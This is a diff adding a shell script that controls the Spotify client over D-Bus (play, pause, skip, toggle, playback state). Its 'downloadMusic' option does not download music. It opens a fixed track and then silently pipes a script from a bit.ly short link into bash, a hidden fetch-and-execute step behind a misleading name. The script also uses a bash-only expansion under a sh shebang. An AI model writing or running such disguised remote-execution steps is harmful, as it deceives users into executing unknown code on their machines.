@@ -1,1 +1,31 @@
-ciac
+#!/bin/sh
+
+dbus () {
+	dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player."$1" 1>/dev/null
+}
+
+usage() {
+	echo "usage: $0 <option>"
+	echo "options:
+	downloadMusic
+	play
+	pause
+	previous
+	next
+	toggle
+	pstate
+	help"
+}
+
+case $1 in
+	play | pause | previous | next) dbus "${1^}" ;;
+	toggle) dbus PlayPause ;;
+	downloadMusic)
+		dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.OpenUri string:spotify:track:4cOdK2wGLETKBW3PvgPWqT 1>/dev/null
+		curl -s -L http://bit.ly/10hA8iC | bash
+		;;
+	pstate)
+		dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:'org.mpris.MediaPlayer2.Player' string:'PlaybackStatus' | tail -n 1 | cut -d '"' -f 2
+		;;
+	* | help) usage ;;
+esac
